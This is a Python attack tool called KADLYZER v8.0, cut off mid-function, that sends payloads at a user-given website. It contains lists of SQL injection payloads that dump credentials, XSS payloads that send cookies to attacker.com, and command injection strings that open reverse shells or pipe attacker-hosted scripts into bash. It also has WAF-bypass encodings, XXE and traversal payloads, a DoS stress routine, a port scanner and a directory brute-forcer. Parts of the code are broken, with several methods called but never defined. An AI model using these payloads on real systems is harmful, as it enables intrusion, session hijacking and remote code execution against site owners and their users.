import requests
import socket
import json
import threading
import random
import base64
import time
import os
import argparse
import concurrent.futures
from urllib.parse import urlparse, urljoin, parse_qs
import logging
from datetime import datetime
import ssl
import re
import ipaddress
import urllib.parse
from bs4 import BeautifulSoup
import aiohttp
import asyncio
import statistics
import string
import sys
import traceback

# ==============================
# KADLYZER v8.0 - Enhanced Version
# ==============================

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    # Tambahan warna
    RED = '\033[31m'
    MAGENTA = '\033[35m'
    WHITE = '\033[37m'
    BLACK = '\033[30m'
    # Background colors
    BG_BLACK = '\033[40m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_WHITE = '\033[47m'

class AnimatedColors:
    @staticmethod
    async def print_animated(text, delay=0.03):
        for char in text:
            colors = [Colors.RED, Colors.GREEN, Colors.BLUE, Colors.MAGENTA, Colors.CYAN]
            color = random.choice(colors)
            print(f"{color}{char}{Colors.ENDC}", end='', flush=True)
            await asyncio.sleep(delay)
        print()
    
    @staticmethod
    async def print_loading(text, duration=2):
        spinner = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
        end_time = time.time() + duration
        i = 0
        while time.time() < end_time:
            print(f"\r{Colors.CYAN}{spinner[i]}{Colors.ENDC} {text}", end='', flush=True)
            i = (i + 1) % len(spinner)
            await asyncio.sleep(0.1)
        print(f"\r✓ {text}")
    
    @staticmethod
    async def print_progress_bar(progress, total, prefix='', suffix=''):
        bar_length = 50
        filled_length = int(round(bar_length * progress / float(total)))
        percents = round(100.0 * progress / float(total), 1)
        bar = '█' * filled_length + '░' * (bar_length - filled_length)
        print(f"\r{Colors.BLUE}{prefix} |{Colors.GREEN}{bar}{Colors.BLUE}| {percents}% {suffix}{Colors.ENDC}", end='', flush=True)
        if progress == total:
            print()

# Advanced WAF bypass headers with rotating techniques
BYPASS_WAF_HEADERS = [
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36", 
     "X-Forwarded-For": "127.0.0.1", 
     "Accept-Language": "en-US,en;q=0.9"},
    
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15", 
     "X-Originating-IP": "127.0.0.1", 
     "Accept-Encoding": "gzip, deflate, br"},
    
    {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36", 
     "Referer": "https://www.google.com/", 
     "DNT": "1"},
    
    {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", 
     "CF-Connecting-IP": "127.0.0.1",
     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
    
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0", 
     "X-Real-IP": "127.0.0.1",
     "Connection": "keep-alive"},
     
    {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/95.0.4638.50 Mobile/15E148 Safari/604.1",
     "X-Client-IP": "127.0.0.1",
     "Cache-Control": "max-age=0"},
]

# Enhanced and layered payloads for different vulnerability types
PAYLOADS = {
    "sql_injection": [
        "' OR '1'='1' --",
        "' OR 1=1 #",
        "' UNION SELECT 1,2,3,4,5--",
        "1' OR '1'='1",
        "1' AND 1=0 UNION SELECT null, CONCAT(username,':',password) FROM users --",
        "admin'--",
        base64.b64encode(b"' OR '1'='1' --").decode(),
        "UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x3c63656e7465723e3c696d673e,0x3c2f63656e7465723e3c646976207374796c653d22646973706c61793a6e6f6e65223e),NULL-- -",
        "AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC)#",
        "AND (SELECT 2222 FROM(SELECT COUNT(*),CONCAT(0x7176627671,(SELECT (ELT(2222=2222,1))),0x7176627671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",
        "AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))",
        "AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version(),0x7e)) USING utf8)))",
        "' UNION ALL SELECT NULL,NULL,NULL,NULL,LOAD_FILE('/etc/passwd')-- -",
        "' AND SLEEP(5) AND 'a'='a"
    ],
    "xss": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<ScRiPt>alert('XSS')</sCrIpT>",
        base64.b64encode(b"<script>alert('XSS')</script>").decode(),
        "<svg/onload=alert`1`>",
        "javascript:eval('var a=document.createElement(\'script\');a.src=\'https://attacker.com/xss.js\';document.body.appendChild(a)')",
        "<img src=x onerror=this.src='https://attacker.com/'+document.cookie>",
        "<script>new Image().src='https://attacker.com/'+document.cookie;</script>",
        "<svg><script>fetch('https://attacker.com/'+document.cookie)</script></svg>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<script>Object.defineProperties(window, {chrome: {get: eval('fetch(\'https://attacker.com/\'+document.cookie)')}})</script>"
    ],
    "path_traversal": [
        "../../../../etc/passwd",
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "/etc/passwd",
        "C:\\Windows\\system.ini",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
    ],
    "command_injection": [
        "'; ping -c 4 127.0.0.1 ;'",
        "& whoami &",
        "| cat /etc/passwd",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
        "'; nc -e /bin/sh attacker.com 4444 ;'",
        "; timeout 10 ping -c 4 127.0.0.1 ;",
        "|wget https://attacker.com/shell.php -O /tmp/shell.php;php /tmp/shell.php|",
        ";curl https://attacker.com/reverse.sh|bash;",
        "$(curl https://attacker.com/payload.txt|base64 -d|bash)",
        "|python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'|",
        ";perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'|",
        "|ncat attacker.com 4444 -e /bin/bash|",
        ";bash -i >& /dev/tcp/attacker.com/4444 0>&1;"
    ],
    "ssrf": [
        "http://localhost/",
        "http://127.0.0.1/",
        "http://[::1]/",
        "file:///etc/passwd",
        "dict://localhost:11211/stats",
        "gopher://localhost:25/",
        "http://169.254.169.254/latest/meta-data/",
    ],
}

# Common HTTP status codes and their meanings
HTTP_STATUS_CODES = {
    200: "OK",
    201: "Created",
    301: "Moved Permanently",
    302: "Found",
    400: "Bad Request",
    401: "Unauthorized",
    403: "Forbidden",
    404: "Not Found",
    405: "Method Not Allowed",
    500: "Internal Server Error",
    502: "Bad Gateway",
    503: "Service Unavailable",
}

# Common directories to check for sensitive information
COMMON_DIRS = [
    "admin/",
    "login/",
    "wp-admin/",
    "backup/",
    "config/",
    ".git/",
    ".env",
    "api/",
    "phpmyadmin/",
    "dashboard/",
    "wp-content/",
    "administrator/",
    "install/",
    "db/",
    "logs/",
    "temp/",
    "test/",
    "dev/",
]

# Advanced port scanning with service identification
COMMON_PORTS = {
    21: "FTP",
    22: "SSH",
    23: "Telnet",
    25: "SMTP",
    53: "DNS",
    80: "HTTP",
    110: "POP3",
    111: "RPC",
    135: "MSRPC",
    139: "NetBIOS",
    143: "IMAP",
    443: "HTTPS",
    445: "SMB",
    993: "IMAPS",
    995: "POP3S",
    1433: "MSSQL",
    1521: "Oracle",
    3306: "MySQL",
    3389: "RDP",
    5432: "PostgreSQL",
    5900: "VNC",
    5985: "WinRM",
    6379: "Redis",
    8080: "HTTP-Proxy",
    8443: "HTTPS-Alt",
    27017: "MongoDB",
}

# Tambahkan teknik bypass WAF yang lebih advanced
ADVANCED_WAF_BYPASS = {
    "headers": [
        # Headers untuk bypass WAF
        {
            "X-Originating-IP": "127.0.0.1",
            "X-Forwarded-For": "127.0.0.1, localhost, 192.168.1.1",
            "X-Remote-IP": "127.0.0.1",
            "X-Remote-Addr": "127.0.0.1", 
            "X-Client-IP": "127.0.0.1",
            "X-Real-IP": "127.0.0.1",
            "Client-IP": "127.0.0.1",
            "X-Forwarded": "127.0.0.1",
            "X-Forwarded-Host": "127.0.0.1",
            "X-Host": "127.0.0.1",
            "True-Client-IP": "127.0.0.1",
            "X-Custom-IP-Authorization": "127.0.0.1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/96.0",
            "Accept": "text/html,application/xhtml+xml,*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "X-Requested-With": "XMLHttpRequest",
            "Connection": "close"
        }
    ],
    
    # Tambahkan teknik bypass yang lebih advanced
    "techniques": [
        {
            "name": "path_traversal",
            "payloads": [
                "....//....//....//etc/passwd",
                "%252e%252e%252fetc%252fpasswd",
                "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
                "..%c0%af..%c0%af..%c0%afetc/passwd",
                "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
                "..%25c0%25af..%25c0%25af..%25c0%25afetc/passwd",
                "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd"
            ]
        },
        {
            "name": "sql_injection",
            "payloads": [
                "/*!50000%75%6e%69on*/ /*!50000%73%65%6c%65ct*/",
                "%23%0A%0AAND%23%0A%0A9227=9227%23%0A%0A%23",
                "+/*!50000UnIoN*/+/*!50000SeLeCt*/+",
                "/*!12345UnIoN*//*!12345sElEcT*/",
                "/*!13337UnIoN*//*!13337SeLeCt*/",
                "/*!50000UnIoN*//*!50000SeLeCt*/",
                "+UnIoN/*&a=*/SeLeCt/*&a=*/",
                "+uni%0bon+se%0blect+",
                "%55%6e%49%6f%4e(%53%65%4c%65%43%74 1,2,3,4)",
                "+union+distinct+select+",
                "+union+distinctROW+select+"
            ]
        }
    ]
}

# Tambahkan payload untuk bypass WAF
BYPASS_PAYLOADS = {
    "sql_injection": [
        "%2f%2a*/union%2f%2a */select%2f%2a*/1,2,3--",
        "/*!50000union*//*!50000select*/1,2,3--",
        "%23%0Aunion%23%0Aselect%23%0A1,2,3--",
        "union /*!50000select*/ 1,2,3--",
        "/*!u%6eion*/ /*!se%6cect*/ 1,2,3--",
    ],
    "xss": [
        "&#x3C;img src=x onerror=alert(1)&#x3E;",
        "<svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>",
        "<details/open/ontoggle=alert`1`>",
        "<svg/onload=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>",
    ]
}

# Tambahkan teknik serangan paralel yang lebih efisien
class ParallelScanner:
    def __init__(self, target_info, max_workers=100):
        self.target_info = target_info
        self.max_workers = max_workers
        self.results = {}
        self.session = requests.Session()
        
    async def async_scan(self):
        """Melakukan scanning secara asynchronous untuk kecepatan maksimal"""
        async with aiohttp.ClientSession() as session:
            tasks = []
            for vuln_type, payloads in PAYLOADS.items():
                for payload in payloads:
                    task = asyncio.create_task(self.test_payload(session, vuln_type, payload))
                    tasks.append(task)
            return await asyncio.gather(*tasks)

    def run_intensive_scan(self):
        """Menjalankan scan intensif dengan multiple threads"""
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            # Test semua endpoint potensial
            for endpoint in self.discover_endpoints():
                futures.extend([
                    executor.submit(self.test_sql_injection, endpoint),
                    executor.submit(self.test_xss, endpoint),
                    executor.submit(self.test_rce, endpoint),
                    executor.submit(self.test_lfi, endpoint),
                    executor.submit(self.test_xxe, endpoint)
                ])
            return futures

# Tambahkan payload yang lebih agresif
ADVANCED_PAYLOADS = {
    "sql_injection_time": [
        "' AND (SELECT 9999 FROM (SELECT(SLEEP(5)))a) AND 'a'='a",
        "' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS GROUP BY CONCAT(VERSION(),FLOOR(RAND(0)*2))) AND 'a'='a",
        "1) AND SLEEP(5) AND (1=1",
        ") WAITFOR DELAY '0:0:5'--",
        "'; EXEC master..xp_cmdshell 'ping -n 5 127.0.0.1'--",
    ],
    "blind_sql": [
        "' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a",
        "' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>90--",
        "' AND (SELECT CASE WHEN (1=1) THEN BENCHMARK(5000000,SHA1('test')) ELSE 1 END)--",
    ],
    "xxe_injection": [
        """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
        """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xxe;</foo>""",
    ],
    "deserialization": [
        'O:8:"stdClass":1:{s:4:"pipe";s:3:"dir";}',
        'a:2:{i:0;s:4:"test";i:1;O:8:"stdClass":1:{s:4:"pipe";s:3:"dir";}}',
    ]
}

# Tambahkan fungsi untuk serangan yang lebih akurat
class AdvancedVulnScanner:
    def __init__(self, target_info):
        self.target_info = target_info
        self.session = requests.Session()
        self.successful_payloads = []
        
    def validate_with_multiple_techniques(self, vuln_type, response, payload):
        """Validasi vulnerability dengan multiple teknik untuk mengurangi false positives"""
        validation_score = 0
        evidence = []
        
        # Analisis response time
        if hasattr(response, 'elapsed'):
            if response.elapsed.total_seconds() > 5:
                validation_score += 30
                evidence.append(f"High response time: {response.elapsed.total_seconds()}s")
        
        # Analisis response content
        content = response.text.lower()
        if any(error in content for error in [
            'sql syntax', 'mysql error', 'ora-', 'postgresql',
            'system.diagnostics', 'fatal error', 'internal server error'
        ]):
            validation_score += 25
            evidence.append("Error message detected")
        
        # Analisis response headers
        if 'X-Powered-By' in response.headers:
            validation_score += 10
            evidence.append(f"Technology disclosure: {response.headers['X-Powered-By']}")
            
        # Differential analysis
        clean_response = self.session.get(self.target_info['full_url'])
        if len(response.content) != len(clean_response.content):
            validation_score += 20
            evidence.append(f"Response length difference: {len(response.content) - len(clean_response.content)}")
        
        return {
            "score": validation_score,
            "evidence": evidence,
            "confirmed": validation_score >= 60
        }

    def perform_advanced_scan(self):
        """Melakukan scanning dengan teknik yang lebih advanced"""
        results = {}
        
        # Multi-threaded scanning untuk setiap jenis vulnerability
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            
            for vuln_type, payloads in {**PAYLOADS, **ADVANCED_PAYLOADS}.items():
                for payload in payloads:
                    futures.append(
                        executor.submit(self.test_payload, vuln_type, payload)
                    )
            
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        vuln_type = result['type']
                        if vuln_type not in results:
                            results[vuln_type] = []
                        results[vuln_type].append(result)
                except Exception as e:
                    logger.error(f"Error in scan: {str(e)}")
        
        return results

    def test_payload(self, vuln_type, payload):
        """Test individual payload dengan validasi yang lebih akurat"""
        try:
            # Prepare URL with payload
            test_url = f"{self.target_info['full_url']}?test={urllib.parse.quote(payload)}"
            
            # Send request with payload
            response = self.session.get(
                test_url,
                headers=random.choice(BYPASS_WAF_HEADERS),
                timeout=10,
                verify=False
            )
            
            # Validate response
            validation = self.validate_with_multiple_techniques(vuln_type, response, payload)
            
            if validation['confirmed']:
                return {
                    'type': vuln_type,
                    'payload': payload,
                    'url': test_url,
                    'evidence': validation['evidence'],
                    'score': validation['score']
                }
                
        except Exception as e:
            logger.debug(f"Payload test failed: {str(e)}")
        return None

# Tambahkan fungsi untuk DoS testing yang lebih efektif
def advanced_dos_test(target_info):
    """Test DoS vulnerability dengan teknik yang lebih advanced"""
    results = {
        "vulnerable": False,
        "evidence": [],
        "response_times": []
    }
    
    baseline_time = measure_response_time(target_info['full_url'])
    
    # Test dengan multiple concurrent connections
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = [
            executor.submit(stress_test_request, target_info['full_url'])
            for _ in range(200)
        ]
        
        for future in concurrent.futures.as_completed(futures):
            try:
                response_time = future.result()
                results['response_times'].append(response_time)
                
                # If response time is significantly higher than baseline
                if response_time > baseline_time * 3:
                    results['vulnerable'] = True
                    results['evidence'].append(
                        f"Response time increased by {response_time/baseline_time:.1f}x"
                    )
            except Exception as e:
                logger.debug(f"DoS test error: {str(e)}")
    
    return results

def stress_test_request(url):
    """Perform stress test request with timing"""
    start_time = time.time()
    try:
        response = requests.get(url, timeout=10)
        return time.time() - start_time
    except:
        return 999  # High value to indicate failure

def measure_response_time(url):
    """Measure baseline response time"""
    times = []
    for _ in range(3):
        try:
            start = time.time()
            requests.get(url, timeout=5)
            times.append(time.time() - start)
        except:
            continue
    return statistics.mean(times) if times else 1.0

# Set up logging
def setup_logging():
    log_dir = "logs"
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = os.path.join(log_dir, f"kadlyzer_{timestamp}.log")
    
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
        handlers=[
            logging.FileHandler(log_file),
            logging.StreamHandler()
        ]
    )
    return logging.getLogger("kadlyzer")

logger = setup_logging()

def banner():
    banner_text = """
    ██╗  ██╗ █████╗ ██████╗ ██╗  ██╗   ██╗███████╗███████╗██████╗ 
    ██║ ██╔╝██╔══██╗██╔══██╗██║  ╚██╗ ██╔╝╚══███╔╝██╔════╝██╔══██╗
    █████╔╝ ███████║██║  ██║██║   ╚████╔╝   ███╔╝ █████╗  ██████╔╝
    ██╔═██╗ ██╔══██║██║  ██║██║    ╚██╔╝   ███╔╝  ██╔══╝  ██╔══██╗
    ██║  ██╗██║  ██║██████╔╝███████╗██║   ███████╗███████╗██║  ██║
    ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝   ╚══════╝╚══════╝╚═╝  ╚═╝
    """
    
    colors = [Colors.RED, Colors.GREEN, Colors.BLUE, Colors.MAGENTA, Colors.CYAN]
    colored_banner = ""
    current_color = 0
    
    for line in banner_text.split('\n'):
        colored_banner += f"{colors[current_color]}{line}{Colors.ENDC}\n"
        current_color = (current_color + 1) % len(colors)
    
    print(colored_banner)
    print(f"{Colors.CYAN}{'='*70}{Colors.ENDC}")
    print(f"{Colors.GREEN}[+] KADLYZER v8.0 - Advanced Security Testing Tool{Colors.ENDC}")
    print(f"{Colors.GREEN}[+] Created by: KADEZ-406{Colors.ENDC}")
    print(f"{Colors.GREEN}[+] Enhanced Security Features & Beautiful UI{Colors.ENDC}")
    print(f"{Colors.CYAN}{'='*70}{Colors.ENDC}\n")

def validate_target(target):
    """Validate and normalize the target input."""
    if not target:
        raise ValueError("Target cannot be empty")
    
    # Add http:// prefix if no scheme provided
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    # Parse the URL
    parsed_url = urlparse(target)
    domain = parsed_url.netloc
    
    # If domain includes port, strip it for some operations
    if ':' in domain:
        domain = domain.split(':')[0]
    
    return {
        'full_url': target,
        'domain': domain,
        'scheme': parsed_url.scheme,
        'path': parsed_url.path,
        'parsed_url': parsed_url
    }

async def recon(target_info):
    """Perform reconnaissance on target"""
    logger.info(f"Starting reconnaissance on {target_info['domain']}")
    results = {
        "whois": None,
        "dns": [],
        "headers": {},
        "technologies": []
    }
    
    try:
        # Parallel tasks
        tasks = [
            get_whois_info(target_info['domain']),
            get_dns_info(target_info['domain']),
            get_headers_info(target_info['full_url']),
            detect_technologies(target_info['full_url'])
        ]
        
        # Wait for all tasks to complete
        whois_info, dns_info, headers_info, tech_info = await asyncio.gather(*tasks)
        
        results["whois"] = whois_info
        results["dns"] = dns_info
        results["headers"] = headers_info
        results["technologies"] = tech_info
        
    except Exception as e:
        logger.error(f"Error during reconnaissance: {str(e)}")
    
    return results

async def scan_ports(target_info, max_threads=100, timeout=1.0, scan_all=False):
    """Scan ports asynchronously"""
    logger.info(f"Starting port scan on {target_info['domain']}")
    results = {}
    
    try:
        # Create port ranges
        if scan_all:
            ports = range(1, 65536)
        else:
            ports = list(range(1, 1025)) + [1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017]
        
        # Create tasks for each port
        tasks = []
        for port in ports:
            task = asyncio.create_task(check_port(target_info['domain'], port, timeout))
            tasks.append(task)
        
        # Wait for all tasks with timeout
        port_results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Process results
        for port, result in zip(ports, port_results):
            if isinstance(result, dict) and result.get('open'):
                results[port] = result
        
    except Exception as e:
        logger.error(f"Error during port scanning: {str(e)}")
    
    return results

async def check_port(host, port, timeout):
    """Check if port is open asynchronously"""
    try:
        # Create connection
        conn = asyncio.open_connection(host, port)
        _, writer = await asyncio.wait_for(conn, timeout=timeout)
        
        # Get banner if possible
        try:
            writer.write(b'HEAD / HTTP/1.0\r\n\r\n')
            await writer.drain()
        except:
            pass
        
        writer.close()
        await writer.wait_closed()
        
        return {
            'open': True,
            'service': get_service_name(port),
            'banner': await grab_banner(host, port)
        }
    except:
        return {'open': False}

def grab_banner(ip, port, timeout=2):
    """Attempt to grab service banner from open port"""
    banner = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        
        # For HTTP/HTTPS ports, send a HTTP request
        if port in [80, 443, 8080, 8443]:
            s.send(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
        else:
            # For other ports, just wait for banner
            pass
        
        banner_data = s.recv(1024)
        banner = banner_data.decode('utf-8', errors='ignore').strip()
        # Truncate banner if too long
        if len(banner) > 40:
            banner = banner[:37] + "..."
    except:
        pass
    finally:
        try:
            s.close()
        except:
            pass
    return banner

def bypass_waf(target_info):
    """Enhanced WAF detection and bypass attempts"""
    url = target_info['full_url']
    logger.info(f"Testing WAF presence and bypass methods on {url}...")
    
    waf_results = {
        "waf_detected": False,
        "waf_type": None,
        "bypass_successful": False,
        "successful_method": None,
        "fingerprints": []
    }
    
    # First, check standard response
    try:
        standard_response = requests.get(url, timeout=10, allow_redirects=True)
        standard_headers = standard_response.headers
        
        # Check for WAF fingerprints in headers
        waf_fingerprints = {
            "Cloudflare": ["cf-ray", "cloudflare"],
            "AWS WAF": ["x-amzn-waf"],
            "Akamai": ["akamai"],
            "Imperva": ["incapsula"],
            "F5 BIG-IP ASM": ["x-f5-id"],
            "ModSecurity": ["mod_security"],
            "Sucuri": ["sucuri"]
        }
        
        for waf_name, signatures in waf_fingerprints.items():
            for header_key, header_value in standard_headers.items():
                for signature in signatures:
                    if signature.lower() in header_key.lower() or signature.lower() in header_value.lower():
                        waf_results["waf_detected"] = True
                        waf_results["waf_type"] = waf_name
                        waf_results["fingerprints"].append(f"{header_key}: {header_value}")
                        logger.info(f"WAF detected: {waf_name}")
                        break
        
        # If no specific WAF identified by headers, check for behavior
        if not waf_results["waf_detected"]:
            # Send a simple payload that would trigger most WAFs
            test_url = url + "?test=<script>alert(1)</script>"
            test_response = requests.get(test_url, timeout=10)
            
            # Check if response differs substantially or returns security error pages
            if test_response.status_code in [403, 406, 429, 503] or "security" in test_response.text.lower() or "blocked" in test_response.text.lower():
                waf_results["waf_detected"] = True
                waf_results["waf_type"] = "Unknown WAF"
                logger.info(f"Generic WAF detected based on behavior")
        
        # Now try various bypass techniques
        if waf_results["waf_detected"]:
            for i, header in enumerate(BYPASS_WAF_HEADERS):
                try:
                    bypass_response = requests.get(url, headers=header, timeout=10)
                    if bypass_response.status_code == 200:
                        logger.info(f"Potential WAF bypass with headers: {header}")
                        # Verify bypass with a light test payload
                        test_url = url + "?id=1' or '1'='1"
                        test_with_headers = requests.get(test_url, headers=header, timeout=10)
                        
                        if test_with_headers.status_code == 200 and "forbidden" not in test_with_headers.text.lower():
                            waf_results["bypass_successful"] = True
                            waf_results["successful_method"] = f"Method {i+1}"
                            logger.info(f"WAF bypass confirmed with method {i+1}")
                            break
                except Exception as e:
                    logger.debug(f"Bypass attempt {i+1} failed: {str(e)}")
                    
            if not waf_results["bypass_successful"]:
                logger.warning("Could not bypass WAF with standard methods")
        else:
            logger.info("No WAF detected")
    
    except Exception as e:
        logger.error(f"WAF detection failed: {str(e)}")
    
    return waf_results

async def directory_scan(target_info, threads=10):
    """Scan directories asynchronously"""
    logger.info(f"Starting directory scan on {target_info['full_url']}")
    results = {}
    
    try:
        # Load wordlist
        with open('wordlists/directories.txt', 'r') as f:
            directories = f.read().splitlines()
        
        # Create tasks for each directory
        tasks = []
        for directory in directories:
            task = asyncio.create_task(check_directory(target_info['full_url'], directory))
            tasks.append(task)
        
        # Wait for all tasks
        dir_results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Process results
        for directory, result in zip(directories, dir_results):
            if isinstance(result, dict) and result.get('exists'):
                results[directory] = result
        
    except Exception as e:
        logger.error(f"Error during directory scanning: {str(e)}")
    
    return results

async def check_directory(base_url, directory):
    """Check if a directory exists and collect information about it"""
    url = urljoin(base_url, directory)
    try:
        headers = random.choice(BYPASS_WAF_HEADERS)
        response = requests.get(url, headers=headers, timeout=5, allow_redirects=False)
        
        # Only return "interesting" results (not 404s)
        if response.status_code != 404:
            return {
                "url": url,
                "status_code": response.status_code,
                "status": HTTP_STATUS_CODES.get(response.status_code, "Unknown"),
                "content_length": len(response.content),
                "title": extract_title(response.text) if response.headers.get('content-type', '').startswith('text/html') else None
            }
        return None
    except:
        return None

def extract_title(html):
    """Extract title from HTML content"""
    match = re.search(r"<title>(.*?)</title>", html, re.IGNORECASE)
    if match:
        return match.group(1)
    return None

def validate_vulnerability(vuln_type, response, payload, url):
    """Validasi vulnerability dengan multiple checks untuk mengurangi false positives"""
    content = response.text.lower()
    headers = response.headers
    status_code = response.status_code
    
    # Validasi dasar
    if status_code == 404:
        return False
        
    validation_results = {
        "confirmed": False,
        "confidence": 0,
        "evidence": []
    }

    if vuln_type == "sql_injection":
        # Check SQL error patterns
        sql_errors = [
            "sql syntax",
            "mysql error",
            "mysql_fetch_array",
            "ora-[0-9]",
            "postgresql error",
            "sqlserver_start_procedure",
            "unclosed quotation mark",
            "you have an error in your sql syntax"
        ]
        
        # Check database output patterns
        db_outputs = [
            r"\b\d+\s+rows?\s+selected?\b",
            r"<td>\s*\d+\s*</td>",
            r"\[(.*?)\]",
            r"array\s*\("
        ]
        
        # Validasi dengan multiple payloads
        confirmation_payloads = [
            "' OR '1'='1",
            "' AND '1'='2",
            "1 UNION SELECT NULL--"
        ]
        
        base_response = requests.get(url, headers=headers, timeout=10)
        base_content_length = len(base_response.text)
        
        for test_payload in confirmation_payloads:
            test_url = url + test_payload
            test_response = requests.get(test_url, headers=headers, timeout=10)
            
            # Compare responses
            if abs(len(test_response.text) - base_content_length) > 100:
                validation_results["confidence"] += 30
                validation_results["evidence"].append(f"Response length difference: {abs(len(test_response.text) - base_content_length)}")
        
        # Check for SQL errors
        for error in sql_errors:
            if re.search(error, content, re.I):
                validation_results["confidence"] += 25
                validation_results["evidence"].append(f"SQL error pattern found: {error}")
        
        # Check for database output patterns
        for pattern in db_outputs:
            if re.search(pattern, content):
                validation_results["confidence"] += 20
                validation_results["evidence"].append(f"Database output pattern found: {pattern}")

    elif vuln_type == "xss":
        # Validasi XSS dengan DOM parsing
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Check if payload is reflected in dangerous contexts
            script_tags = soup.find_all('script')
            event_handlers = soup.find_all(lambda tag: any(attr.startswith('on') for attr in tag.attrs))
            
            payload_encoded = [
                payload,
                html.escape(payload),
                urllib.parse.quote(payload)
            ]
            
            for p in payload_encoded:
                if p in response.text:
                    validation_results["confidence"] += 30
                    validation_results["evidence"].append(f"Payload reflected: {p}")
                
            if script_tags:
                validation_results["confidence"] += 25
                validation_results["evidence"].append(f"Found in <script> tags: {len(script_tags)}")
                
            if event_handlers:
                validation_results["confidence"] += 25
                validation_results["evidence"].append(f"Found in event handlers: {len(event_handlers)}")
                
        except Exception as e:
            logger.debug(f"XSS validation error: {str(e)}")

    elif vuln_type == "path_traversal":
        # Check for file content patterns
        file_patterns = {
            "unix_passwd": r"root:.*:0:0:",
            "win_ini": r"\[.*\].*=.*",
            "proc_self": r"cwd.*groups.*cmdline",
            "etc_shadow": r"root:\$.*:.*:.*"
        }
        
        for pattern_name, pattern in file_patterns.items():
            if re.search(pattern, content):
                validation_results["confidence"] += 35
                validation_results["evidence"].append(f"File content pattern found: {pattern_name}")
        
        # Check for directory listing
        if "index of /" in content or "directory listing for" in content:
            validation_results["confidence"] += 25
            validation_results["evidence"].append("Directory listing detected")

    elif vuln_type == "command_injection":
        # Check for command output patterns
